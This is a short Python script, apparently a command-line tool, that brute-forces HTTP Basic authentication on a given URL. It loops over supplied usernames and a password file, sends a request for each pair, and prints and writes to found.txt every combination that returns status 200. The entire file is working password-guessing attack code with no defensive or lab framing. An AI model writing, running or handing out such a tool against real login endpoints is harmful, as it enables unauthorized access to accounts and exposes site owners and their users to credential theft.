import requests
import argparse

ps = argparse.ArgumentParser()
ps.add_argument('-u','--user', type=str,nargs='+', required=False, help="single username or username list")
ps.add_argument('-P','--passwd', type=str, required=False, help="name of password file")
ps.add_argument('--url', type=str, required=True, help="URL")
arg=ps.parse_args()

try:
    url = arg.url
    username = arg.user

    file=open(arg.passwd, 'r')
    password_list = file.read().split('\n')
    file.close()
except:
    print('syntax error or missing arguments')
    exit()

def brute(user_list, pass_list):

    found = open('found.txt', 'w')

    for j in range(0, len(user_list)):
        print(f'---results for {user_list[j]}---')
        for i in range(0, len(pass_list)):
            try:
                print(f'trying password: {pass_list[i]} ...')
                r = requests.get(url=url, auth=(user_list[j], pass_list[i]))
                if r.status_code == 200:
                    print(f'[!] PASSWORD FOUND: {pass_list[i]}')
                    found.write(f'{user_list[j]}: {pass_list[i]}\n')
                else:
                    pass
            except:
                pass
        print()
    found.close()

brute(user_list=username, pass_list=password_list)